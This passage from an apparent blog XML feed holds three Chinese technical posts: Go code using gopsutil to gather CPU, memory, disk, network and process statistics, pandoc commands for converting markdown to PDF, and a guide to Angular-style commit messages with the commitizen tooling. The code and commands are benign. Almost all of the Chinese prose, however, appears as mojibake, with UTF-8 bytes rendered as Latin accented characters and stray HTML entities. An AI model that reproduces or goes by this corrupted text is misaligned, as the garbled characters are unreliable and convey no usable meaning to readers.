å®ç°äº†è¿›ç¨‹ç®¡ç†,ç³»ç»Ÿè¯Šæ–­, è¿™ä¸ªåº“åŸºæœ¬å®ç°äº†è¿™äº›å‘½ä»¤è¡Œå·¥å…·çš„åŠŸèƒ½: ps, top, lsof, netstat, ifconfig, who, df, kill, free, nice, ionice, iostat, iotop, uptime, pidof, tty, taskset, pmap å¦‚æœæƒ³è¦äº†è§£å…³äºgopsutilsæ›´å¤šçš„è¯¦æƒ… è¯·æŸ¥çœ‹gopsutils githubåœ°å€ å®‰è£…1âœ gops_test go get -v &quot;github.com/shirou/gopsutil&quot; ä½¿ç”¨å…·ä½“çš„ä½¿ç”¨æ–‡æ¡£å¯ä»¥å‚è€ƒgopsutilçš„godocæ–‡æ¡£ä»¥ä¸‹ä»¥æµ‹è¯•æ”¶é›†cpu, disk, load, mem, net, process ä¸ºåˆ—, æ³¨æ„è¿™äº›å¯¹è±¡éƒ½ä½¿ç”¨Stringæ–¹æ³•, å› æ­¤å¯ä»¥ç›´æ¥è°ƒç”¨fmtæ‰“å°ï¼ŒStringæ–¹æ³•ä¼šå°†å…¶è½¬æ¢æˆJsonè¾“å‡º.12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package mainimport ( "fmt" "github.com/shirou/gopsutil/cpu" "github.com/shirou/gopsutil/disk" "github.com/shirou/gopsutil/load" "github.com/shirou/gopsutil/mem" "github.com/shirou/gopsutil/net" "github.com/shirou/gopsutil/process")func main() &#123; fmt.Println("CPUç»Ÿè®¡:") c, _ := cpu.Info() fmt.Println(c) fmt.Println("å†…å­˜ç»Ÿè®¡:") m, _ := mem.VirtualMemory() fmt.Println(m) fmt.Println("ç£ç›˜ç”¨é‡å’ŒIOç»Ÿè®¡:") dp, _ := disk.Partitions(true) du, _ := disk.Usage("/") di, _ := disk.IOCounters() fmt.Println(du) fmt.Println(dp) fmt.Println(di) fmt.Println("ç½‘ç»œIOç»Ÿè®¡:") ni, _ := net.IOCounters(true) fmt.Println(ni) fmt.Println("åè®®ç»Ÿè®¡:") nt, _ := net.ProtoCounters(nil) fmt.Println(nt) fmt.Println("é“¾æ¥çŠ¶æ€ç»Ÿè®¡:") nc, _ := net.Connections("all") fmt.Println(nc) fmt.Println("è¿›ç¨‹ç»Ÿè®¡:") pi, _ := process.Pids() fmt.Println(pi) p, _ := process.NewProcess(614) pm, _ := p.MemoryPercent() pn, _ := p.Username() fmt.Println(pm) fmt.Println(pn) fmt.Println("è´Ÿè½½ç»Ÿè®¡:") pl, _ := load.Avg() fmt.Println(pl)&#125; æœ€åæ‰§è¡Œè¿‡ä¼šçš„ç»“æœå¤§æ¦‚ä¸ºè¿™æ ·:1234567891011121314151617181920CPUç»Ÿè®¡:[&#123;&quot;cpu&quot;:0,&quot;vendorId&quot;:&quot;GenuineIntel&quot;,&quot;family&quot;:&quot;6&quot;,&quot;model&quot;:&quot;69&quot;,&quot;stepping&quot;:1,&quot;physicalId&quot;:&quot;&quot;,&quot;coreId&quot;:&quot;&quot;,&quot;cores&quot;:2,&quot;modelName&quot;:&quot;Intel(R) Core(TM) i5-4278U CPU @ 2.60GHz&quot;,&quot;mhz&quot;:2600,&quot;cacheSize&quot;:256,&quot;flags&quot;:[&quot;fpu&quot;,&quot;vme&quot;,&quot;de&quot;,&quot;pse&quot;,&quot;tsc&quot;,&quot;msr&quot;,&quot;pae&quot;,&quot;mce&quot;,&quot;cx8&quot;,&quot;apic&quot;,&quot;sep&quot;,&quot;mtrr&quot;,&quot;pge&quot;,&quot;mca&quot;,&quot;cmov&quot;,&quot;pat&quot;,&quot;pse36&quot;,&quot;clfsh&quot;,&quot;ds&quot;,&quot;acpi&quot;,&quot;mmx&quot;,&quot;fxsr&quot;,&quot;sse&quot;,&quot;sse2&quot;,&quot;ss&quot;,&quot;htt&quot;,&quot;tm&quot;,&quot;pbe&quot;,&quot;sse3&quot;,&quot;pclmulqdq&quot;,&quot;dtes64&quot;,&quot;mon&quot;,&quot;dscpl&quot;,&quot;vmx&quot;,&quot;est&quot;,&quot;tm2&quot;,&quot;ssse3&quot;,&quot;fma&quot;,&quot;cx16&quot;,&quot;tpr&quot;,&quot;pdcm&quot;,&quot;sse4.1&quot;,&quot;sse4.2&quot;,&quot;x2apic&quot;,&quot;movbe&quot;,&quot;popcnt&quot;,&quot;aes&quot;,&quot;pcid&quot;,&quot;xsave&quot;,&quot;osxsave&quot;,&quot;seglim64&quot;,&quot;tsctmr&quot;,&quot;avx1.0&quot;,&quot;rdrand&quot;,&quot;f16c&quot;,&quot;smep&quot;,&quot;erms&quot;,&quot;rdwrfsgs&quot;,&quot;tsc_thread_offset&quot;,&quot;bmi1&quot;,&quot;avx2&quot;,&quot;bmi2&quot;,&quot;invpcid&quot;,&quot;fpu_csds&quot;,&quot;syscall&quot;,&quot;xd&quot;,&quot;1gbpage&quot;,&quot;em64t&quot;,&quot;lahf&quot;,&quot;lzcnt&quot;,&quot;rdtscp&quot;,&quot;tsci&quot;]&#125;]å†…å­˜ç»Ÿè®¡:&#123;&quot;total&quot;:8589934592,&quot;available&quot;:4315959296,&quot;used&quot;:4273975296,&quot;usedPercent&quot;:49.7556209564209,&quot;free&quot;:3390992384,&quot;active&quot;:2908176384,&quot;inactive&quot;:924966912,&quot;wired&quot;:1364955136,&quot;buffers&quot;:0,&quot;cached&quot;:0,&quot;writeback&quot;:0,&quot;dirty&quot;:0,&quot;writebacktmp&quot;:0,&quot;shared&quot;:0,&quot;slab&quot;:0,&quot;pagetables&quot;:0,&quot;swapcached&quot;:0&#125;ç£ç›˜ç”¨é‡å’ŒIOç»Ÿè®¡:&#123;&quot;path&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;total&quot;:249769230336,&quot;free&quot;:201003577344,&quot;used&quot;:48503508992,&quot;usedPercent&quot;:19.41932916506611,&quot;inodesTotal&quot;:60978814,&quot;inodesUsed&quot;:11905675,&quot;inodesFree&quot;:49073139,&quot;inodesUsedPercent&quot;:19.524281006842802&#125;[&#123;&quot;device&quot;:&quot;/dev/disk1&quot;,&quot;mountpoint&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;opts&quot;:&quot;rw,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;devfs&quot;,&quot;mountpoint&quot;:&quot;/dev&quot;,&quot;fstype&quot;:&quot;devfs&quot;,&quot;opts&quot;:&quot;rw,suiddir,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map -hosts&quot;,&quot;mountpoint&quot;:&quot;/net&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,nosuid,suiddir,nosymfollow,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map auto_home&quot;,&quot;mountpoint&quot;:&quot;/home&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,suiddir,nosymfollow,multilabel&quot;&#125;]map[]ç½‘ç»œIOç»Ÿè®¡:[&#123;&quot;name&quot;:&quot;lo0&quot;,&quot;bytesSent&quot;:22687,&quot;bytesRecv&quot;:22687,&quot;packetsSent&quot;:215,&quot;packetsRecv&quot;:215,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;gif0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;stf0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en0&quot;,&quot;bytesSent&quot;:6401764,&quot;bytesRecv&quot;:120874758,&quot;packetsSent&quot;:85192,&quot;packetsRecv&quot;:87266,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en1&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en2&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;p2p0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;awdl0&quot;,&quot;bytesSent&quot;:2331,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:2,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;bridg&quot;,&quot;bytesSent&quot;:342,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:1,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125;]åè®®ç»Ÿè®¡:[]é“¾æ¥çŠ¶æ€ç»Ÿè®¡:[&#123;&quot;fd&quot;:13,&quot;family&quot;:2,&quot;type&quot;:2,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;*&quot;,&quot;port&quot;:63824&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;&quot;,&quot;port&quot;:0&#125;,&quot;status&quot;:&quot;&quot;,&quot;uids&quot;:null,&quot;pid&quot;:238&#125; &#123;&quot;fd&quot;:64,&quot;family&quot;:2,&quot;type&quot;:1,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;192.168.3.7&quot;,&quot;port&quot;:49224&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;191.238.172.191&quot;,&quot;port&quot;:443&#125;,&quot;status&quot;:&quot;CLOSED&quot;,&quot;uids&quot;:null,&quot;pid&quot;:394&#125;]è¿›ç¨‹ç»Ÿè®¡:[1 45 46 48 49 53 54 55 62 64 65 69 70 71 73 74 76 77 79 80 81 82 83 85 88 89 93 95 96 97 98 100 101 102 105 110 118 130 133 135 136 142 143 147 149 159 168 169 170 171 172 173 174 175 179 182 183 184 185 187 188 189 190 192 195 196 197 198 200 218 219 220 226 227 229 231 232 233 237 238 239 242 243 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 265 266 267 268 269 270 271 272 273 274 276 277 278 279 280 281 282 283 284 285 286 287 289 290 291 292 294 295 296 297 299 300 302 305 307 308 311 312 314 316 317 324 325 329 339 340 342 343 344 345 346 348 360 361 362 366 367 368 371 377 386 391 392 393 394 397 423 426 427 428 429 430 433 437 443 445 446 451 452 454 455 456 461 463 469 470 474 475 477 481 483 486 487 488 511 514 554 555 624 650 711 722 723 724 725 726 727 729 736 737 741 742 743 791 866 867 878 880 883 889 516 517 518]0rootè´Ÿè½½ç»Ÿè®¡:&#123;&quot;load1&quot;:1.32,&quot;load5&quot;:1.35,&quot;load15&quot;:1.31&#125;]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>gopsutils</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨pandocå°†markdownæ–‡æ¡£è½¬æ¢æˆpdf]]></title>
    <url>%2F2017%2F01%2F19%2Fmarkdown-to-pdf%2F</url>
    <content type="text"><![CDATA[åœ¨å…¬å¸åšå†…éƒ¨åˆ†äº«çš„æ—¶å€™å¾€å¾€ç”¨ppt, å†™pptçš„è¿‡ç¨‹ä¸­å¾€å¾€è¿˜æœ‰æ¯”è¾ƒå¤šçš„ä»£ç ç¤ºä¾‹, é€šå¸¸çš„åšæ³•å°±æ˜¯ç›´æ¥æˆªå›¾, å…¶å®è¿™å¯¹ä½¿ç”¨è€…æ¥è¯´æ˜¯å¾ˆä¸å‹å¥½çš„, è€Œæˆ‘ä¹‹å‰ä¸€ç›´ä½¿ç”¨markdownå†™åšå®¢, æ¯”å¦‚æˆ‘è¿™ä¸ªåšå®¢, å› æ­¤å°±æƒ³ä½¿ç”¨MarkDownæ¥å†™åˆ†äº«çš„æ–‡æ¡£, ä½†æ˜¯MarkDownçš„æ–‡æ¡£å¹¶ä¸æ–¹ä¾¿å†…éƒ¨ä¼ é˜…, å› æ­¤æƒ³åˆ°äº†ä¸€ä¸ªé—®é¢˜: èƒ½å¦ç”¨MarkDownå†™, ç„¶åè½¬æ¢æˆPDF, ç»™åŒäº‹ä½¿ç”¨ï¼Ÿäºæ˜¯é—®äº†ä¸‹åº¦å¨˜, æœç„¶æ‰¾åˆ°äº†ä¸€ä¸ªå·¥å…·: Pandoc, ä½¿ç”¨ä¸‹æ¥æ„Ÿè§‰ä¸é”™, åœ¨æ­¤åˆ†äº«ä¸€ä¸‹ä½¿ç”¨æ–¹æ³•, ä¹Ÿæ–¹ä¾¿ä»¥åè‡ªå·±æŸ¥é˜…ã€‚ ç®€ä»‹Pandocæ˜¯ä¸€ä¸ªç”¨haskellç¼–å†™çš„å¼€æºæ–‡æœ¬è½¬æ¢å·¥å…·ï¼Œå°å·§è¿…é€Ÿä¸”æ”¯æŒæ ¼å¼å¹¿æ³›ï¼Œå ªç§°æ–‡æœ¬è½¬æ¢åº”ç”¨çš„ç‘å£«å†›åˆ€ã€‚æ”¯æŒå¾ˆå¤šç§è¾“å…¥è¾“å‡ºï¼Œæœ‰å…³Pandocå¯ä»¥åœ¨å…¶å®˜ç½‘è¿›è¡Œè¯¦ç»†äº†è§£ã€‚ä¸‹è½½é¡µé¢å¯ä»¥ç‚¹æ­¤è¿›å…¥ï¼Œåœ¨å…¶ä¸­é€‰æ‹©åˆé€‚çš„ç‰ˆæœ¬å³å¯ï¼ˆGitHubä¸‹è½½ä¸å¤šèµ˜è¿°), è‡³äºè¯¦ç»†çš„æè¿°è¯·çœ‹githubä¸Šçš„è¯´æ˜ã€‚æˆ‘è¿™é‡Œä¸»è¦ä½¿ç”¨ markdownâ€”-&gt;pdfã€‚ å®‰è£…æˆ‘è¿™é‡Œä»…ä»‹ç»Macä¸‹çš„å®‰è£…, éœ€è¦å®‰è£…pandocå’ŒLaTeXå…¶ä»–å¹³å°å®˜æ–¹æœ‰è¯¦å°½çš„ä»‹ç», å…·ä½“è¯·æŸ¥çœ‹ï¼špandocå®˜æ–¹å®‰è£…æ–‡æ¡£ pandocå®‰è£…1$ brew install pandoc LaTeXå®‰è£…å› ä¸ºæˆ‘éœ€è¦è½¬æ¢æˆpdf,è¿˜éœ€è¦è£…LaTeX, é€‰ä¸€ä¸ªBasicç‰ˆæœ¬çš„å®‰è£…å³å¯, LaTeXçš„ä¸‹è½½åœ°å€ ä½¿ç”¨ç®€å•çš„ä½¿ç”¨å¯ä»¥1$ pandoc -h è¯¦ç»†ç”¨æ³•å¯ä»¥manæŸ¥çœ‹ï¼Œæˆ‘è¿™é‡Œç›´æ¥ç»™å¹²æ´»äº†,æˆ‘ä½¿ç”¨åºæˆ¿,è¿™é‡Œè®°å¾—é€‰ä¸€ç§ä½ ç³»ç»Ÿä¸Šæœ‰çš„å­—ä½“ã€‚1pandoc -N -s --toc --latex-engine=xelatex -V CJKmainfont=&apos;PingFang SC&apos; -V mainfont=&apos;Monaco&apos; -V geometry:margin=1in Keystone_extension.markdown -o Keystone.pdf æ³¨æ„äº‹é¡¹ä¸»è¦æ˜¯Pandocé»˜è®¤æ˜¯å¯¹markDownè¯­æ³•æœ‰æ‰©å±•ï¼Œå¦‚æœé‡åˆ°è½¬æ¢åçš„æ•ˆæœå’Œé¢„æœŸæ•ˆæœä¸ä¸€æ ·, è¿˜å¾—é˜…è¯»Pandocæ‰©å±•çš„MarkDownè¯­æ³•, è¿™ç¯‡åšå®¢å¯¹æ¬¡ä»‹ç»ä¸é”™Pandocä¸­çš„markdownè¯­æ³•æˆ‘è¿™é‡Œä»…åˆ—ä¸¾ä¸€ä¸ªæˆ‘é‡åˆ°çš„å‘ï¼Œå½“ç„¶å¦‚æœä½ æƒ³ä½¿ç”¨æ ‡å‡†çš„MarkDownè¯­æ³•ï¼Œä¹Ÿå¯-f markdown_strictã€‚ å›¾ç‰‡ä½ç½®å¯¹åº”ä¸ä¸Šåœ¨markDownä¸­æ’å…¥çš„å›¾ç‰‡å’ŒMarkdowné‡Œçš„ä¸ä¸€æ ·, è¿™é‡Œéœ€è¦åœ¨å›¾ç‰‡åé¢æ·»åŠ ä¸€ä¸ª\, è¿™æ ·å›¾ç‰‡æ‰ä¸ä¼šæ¢è¡Œ, è¿™ä¸ªåœ¨å®ƒæ‰©å±•è¯­æ³•ä¸­æœ‰æè¿°ã€‚]]></content>
      <categories>
        <category>æ–‡æ¡£å·¥å…·</category>
        <category>pandoc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[commit messageç¼–å†™è§„èŒƒ]]></title>
    <url>%2F2017%2F01%2F17%2Fcommit-message-style%2F</url>
    <content type="text"><![CDATA[Gitæ¯æ¬¡æäº¤ä»£ç ï¼Œéƒ½è¦å†™Commit message(æäº¤è¯´æ˜)ï¼Œå¦åˆ™å°±ä¸å…è®¸æäº¤, Commit messageå¾€å¾€ä¼šç”¨äºç”ŸæˆChange logæ–‡æ¡£, è§„èŒƒçš„Commit messageæ˜¯ä¸€ä¸ªé«˜è´¨é‡é¡¹ç›®åŸºæœ¬è¦æ±‚ã€‚ç¤¾åŒºæœ‰å¤šç§Commit messageçš„å†™æ³•è§„èŒƒã€‚å…¶ä¸­ä»¥å›½é™…çŸ¥åé¡¹ç›®AngularJSçš„è§„èŒƒä½¿ç”¨æœ€ä¸ºå¹¿æ³›, å› ä¸ºå…¶æ¯”è¾ƒåˆç†å’Œç³»ç»ŸåŒ–,å¹¶ä¸”æœ‰ç›¸åº”çš„é…å¥—å·¥å…·ã€‚ ä½œç”¨æ ¼å¼åŒ–å¾—Commit messageæœ‰å¾ˆå¤šå¥½å¤„ æä¾›æ›´å¤šçš„å†å²ä¿¡æ¯ï¼Œæ–¹ä¾¿å¿«é€Ÿæµè§ˆ 1234567$ git log &lt;last tag&gt; HEAD --pretty=format:%sæ·»åŠ testcaseæ·»åŠ ignoreæ ¼å¼æ·»åŠ py2æ”¯æŒè¡¥å……entry_pointsæ·»åŠ æµ‹è¯•ç¯å¢ƒæ–‡ä»¶æ·»åŠ toxæµ‹è¯•ç›¸å…³æ–‡ä»¶ å¯ä»¥è¿‡æ»¤æŸäº›commitï¼ˆæ¯”å¦‚æ–‡æ¡£æ”¹åŠ¨ï¼‰ï¼Œä¾¿äºå¿«é€ŸæŸ¥æ‰¾ä¿¡æ¯ 123456789101112131415git log HEAD --grep 'æ·»åŠ 'commit dfedec2ca55bc57137e1ffe430f9f7216d912ca0Merge: 5fcae1d f5c5120Author: ç´«å·ç§€ &lt;719118794@qq.com&gt;Date: Mon Jan 9 19:13:47 2017 +0800 Merge pull request #1 from huang75961/master æ·»åŠ toxæµ‹è¯•commit f5c5120ac5bb43529bd2eb9e83ccef023450a8a5Author: hc &lt;409438984@qq.com&gt;Date: Mon Jan 9 19:00:32 2017 +0800 æ·»åŠ testcase å¯ä»¥ç›´æ¥ä»commitç”ŸæˆChange log è¿™ä¸ªéœ€è¦é…åˆåé¢çš„å·¥å…·ä½¿ç”¨ è§„èŒƒæ¯æ¬¡æäº¤ï¼ŒCommit message éƒ½åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼šHeaderï¼ŒBody å’Œ Footerã€‚12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&lt;body&gt;&lt;footer&gt; å…¶ä¸­ï¼ŒHeader æ˜¯å¿…éœ€çš„ï¼ŒBody å’Œ Footer å¯ä»¥çœç•¥ã€‚ä¸ç®¡æ˜¯å“ªä¸€ä¸ªéƒ¨åˆ†ï¼Œä»»ä½•ä¸€è¡Œéƒ½ä¸å¾—è¶…è¿‡72ä¸ªå­—ç¬¦ï¼ˆæˆ–100ä¸ªå­—ç¬¦ï¼‰ã€‚è¿™æ˜¯ä¸ºäº†é¿å…è‡ªåŠ¨æ¢è¡Œå½±å“ç¾è§‚ã€‚ HeaderHeaderéƒ¨åˆ†åªæœ‰ä¸€è¡Œï¼ŒåŒ…æ‹¬ä¸‰ä¸ªå­—æ®µï¼štypeï¼ˆå¿…éœ€ï¼‰ã€scopeï¼ˆå¯é€‰ï¼‰å’Œsubjectï¼ˆå¿…éœ€ï¼‰ã€‚ typeç”¨äºè¯´æ˜commitçš„ç±»åˆ«ï¼Œåªå…è®¸ä½¿ç”¨ä¸‹é¢7ä¸ªæ ‡è¯† featï¼šæ–°åŠŸèƒ½ï¼ˆfeatureï¼‰ fixï¼šä¿®è¡¥bug docsï¼šæ–‡æ¡£ï¼ˆdocumentationï¼‰ styleï¼š æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰ refactorï¼šé‡æ„ï¼ˆå³ä¸æ˜¯æ–°å¢åŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹bugçš„ä»£ç å˜åŠ¨ï¼‰ testï¼šå¢åŠ æµ‹è¯• choreï¼šæ„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨ å¦‚æœtypeä¸ºfeatå’Œfixï¼Œåˆ™è¯¥commitå°†è‚¯å®šå‡ºç°åœ¨Change logä¹‹ä¸­ã€‚å…¶ä»–æƒ…å†µï¼ˆdocsã€choreã€styleã€refactorã€testï¼‰ç”±ä½ å†³å®šï¼Œè¦ä¸è¦æ”¾å…¥Change logï¼Œå»ºè®®æ˜¯ä¸è¦ã€‚ scopescopeç”¨äºè¯´æ˜ commit å½±å“çš„èŒƒå›´ï¼Œæ¯”å¦‚æ•°æ®å±‚ã€æ§åˆ¶å±‚ã€è§†å›¾å±‚ç­‰ç­‰ï¼Œè§†é¡¹ç›®ä¸åŒè€Œä¸åŒ subjectsubjectæ˜¯ commit ç›®çš„çš„ç®€çŸ­æè¿°ï¼Œä¸è¶…è¿‡50ä¸ªå­—ç¬¦ã€‚ ä»¥åŠ¨è¯å¼€å¤´ï¼Œä½¿ç”¨ç¬¬ä¸€äººç§°ç°åœ¨æ—¶ï¼Œæ¯”å¦‚changeï¼Œè€Œä¸æ˜¯changedæˆ–changes ç¬¬ä¸€ä¸ªå­—æ¯å°å†™ ç»“å°¾ä¸åŠ å¥å·ï¼ˆ.ï¼‰ BodyBody éƒ¨åˆ†æ˜¯å¯¹æœ¬æ¬¡ commit çš„è¯¦ç»†æè¿°ï¼Œå¯ä»¥åˆ†æˆå¤šè¡Œã€‚ä½†æ˜¯æœ‰ä¸¤ä¸ªæ³¨æ„ç‚¹ã€‚ ä½¿ç”¨ç¬¬ä¸€äººç§°ç°åœ¨æ—¶ï¼Œæ¯”å¦‚ä½¿ç”¨changeè€Œä¸æ˜¯changedæˆ–changesã€‚ åº”è¯¥è¯´æ˜ä»£ç å˜åŠ¨çš„åŠ¨æœºï¼Œä»¥åŠä¸ä»¥å‰è¡Œä¸ºçš„å¯¹æ¯”ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªangularé¡¹ç›®ä¸‹é¢çš„ä¸€ä¸ªèŒƒä¾‹ã€‚1234567891011Protractor users were having a problem where if they had asynchonous code in a`route.resolve` or `route.resolveRedirectTo` variable, Protractor was notwaiting for that code to complete before continuing. Seeangular/protractor#789 (comment) fordetails.This commit fixes it by ensuring that `$browser#outstandingRequestCount` isproperly increased/decreased while `$route` (asynchronously) processes a route.Also, enhanced `ngMock` to wait for pending requests, before calling callbacksfrom `$browser.notifyWhenNoOutstandingRequests()`. Footerè¯¥éƒ¨åˆ†ä¸»è¦æ˜¯ç”¨äºå˜æ›´è¿‡ä¼šçš„ä¸€äº›åç»­æ“ä½œçš„, æ¯”å¦‚å…³é—­issue, æ’¤é”€ä¹‹å‰çš„commitç­‰ å…³é—­Issueå¦‚æœå½“å‰ commit é’ˆå¯¹æŸä¸ªissueï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ Footer éƒ¨åˆ†å…³é—­è¿™ä¸ª issue ã€‚ä¹Ÿå¯ä»¥ä¸€æ¬¡å…³é—­å¤šä¸ªissue 1Closes #112 1Closes #221, 222, 223 æ’¤é”€ä¹‹å‰çš„commitå¦‚æœå½“å‰ commit ç”¨äºæ’¤é”€ä»¥å‰çš„ commitï¼Œåˆ™å¿…é¡»ä»¥revert:å¼€å¤´ï¼Œåé¢è·Ÿç€è¢«æ’¤é”€ Commit çš„ Headerã€‚Bodyéƒ¨åˆ†çš„æ ¼å¼æ˜¯å›ºå®šçš„ï¼Œå¿…é¡»å†™æˆThis reverts commit hash.ï¼Œå…¶ä¸­çš„hashæ˜¯è¢«æ’¤é”€ commit çš„ SHA æ ‡è¯†ç¬¦ã€‚å¦‚æœå½“å‰ commit ä¸è¢«æ’¤é”€çš„ commitï¼Œåœ¨åŒä¸€ä¸ªå‘å¸ƒï¼ˆreleaseï¼‰é‡Œé¢ï¼Œé‚£ä¹ˆå®ƒä»¬éƒ½ä¸ä¼šå‡ºç°åœ¨ Change log é‡Œé¢ã€‚å¦‚æœä¸¤è€…åœ¨ä¸åŒçš„å‘å¸ƒï¼Œé‚£ä¹ˆå½“å‰ commitï¼Œä¼šå‡ºç°åœ¨ Change log çš„Revertså°æ ‡é¢˜ä¸‹é¢ã€‚123revert: feat(pencil): add 'graphiteWidth' optionThis reverts commit 667ecc1654a317a13331b17617d973392f415f02. ä¸å…¼å®¹å˜åŠ¨å¦‚æœå½“å‰ä»£ç ä¸ä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸å…¼å®¹ï¼Œåˆ™ Footer éƒ¨åˆ†ä»¥BREAKING CHANGEå¼€å¤´ï¼Œåé¢æ˜¯å¯¹å˜åŠ¨çš„æè¿°ã€ä»¥åŠå˜åŠ¨ç†ç”±å’Œè¿ç§»æ–¹æ³•ã€‚1234567891011121314151617BREAKING CHANGE: isolate scope bindings definition has changed. To migrate the code follow the example below: Before: scope: &#123; myAttr: 'attribute', &#125; After: scope: &#123; myAttr: '@', &#125; The removed `inject` wasn't generaly useful for directives so there should be no code using it. å·¥å…·åŸºäºcommit messageæœ‰ä¸°å¯Œçš„å·¥å…·ï¼ŒåŒ…æ‹¬ç¼–è¾‘å™¨ï¼Œæ ¡éªŒå·¥å…·ï¼Œä»¥åŠç”ŸæˆChange logçš„å·¥å…· Commitizenç¼–è¾‘å·¥å…·Commitizenæ˜¯ä¸€ä¸ªæ’°å†™åˆæ ¼ Commit message çš„å·¥å…·, è¯¦ç»†è¯´æ˜githubåœ°å€ å®‰è£…1) å…¨å±€å®‰è£…(è®°å¾—ä½¿ç”¨æ·˜å®æºæ¥åŠ é€Ÿ)123âœ ~ npm install -g commitizenâœ ~ npm install -g cz-conventional-changelogecho '&#123; "path": "cz-conventional-changelog" &#125;' &gt; ~/.czrc 2ï¼‰å±€éƒ¨å®‰è£…12âœ ~ npm install commitizen -gâœ ~ commitizen init cz-conventional-changelog --save-dev --save-exact ä¸»è¦å¦‚æœæŠ¥package.jsonä¸å­˜åœ¨,éœ€è¦æ·»åŠ è¿™ä¸ªæ–‡ä»¶, è¿™æ˜¯nodejsçš„åŒ…ç®¡ç†æ–‡ä»¶, æ ¼å¼å¯ä»¥å‚æ•°commitizenåŒ…çš„package.json ä½¿ç”¨123456789101112131415âœ device git:(master) âœ— git czcz-cli@2.9.5, cz-conventional-changelog@1.2.0Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.? Select the type of change that you're committing: (Use arrow keys)â¯ feat: A new feature fix: A bug fix docs: Documentation only changes style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc) refactor: A code change that neither fixes a bug nor adds a feature perf: A code change that improves performance test: Adding missing tests or correcting existing tests(Move up and down to reveal more choices) validate-commit-msgæ ¡éªŒå·¥å…·validate-commit-msg ç”¨äºæ£€æŸ¥ Node é¡¹ç›®çš„ Commit message æ˜¯å¦ç¬¦åˆæ ¼å¼ã€‚æˆ‘æš‚æ—¶ä¸éœ€è¦,githubåœ°å€ ç”ŸæˆChange logçš„å·¥å…·conventional-changelog å°±æ˜¯ç”Ÿæˆ Change log çš„å·¥å…·ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤å³å¯ã€‚githubåœ°å€123$ npm install -g conventional-changelog-cli$ cd my-project$ conventional-changelog -p angular -i CHANGELOG.md -s ä¸Šé¢å‘½ä»¤ä¸ä¼šè¦†ç›–ä»¥å‰çš„ Change 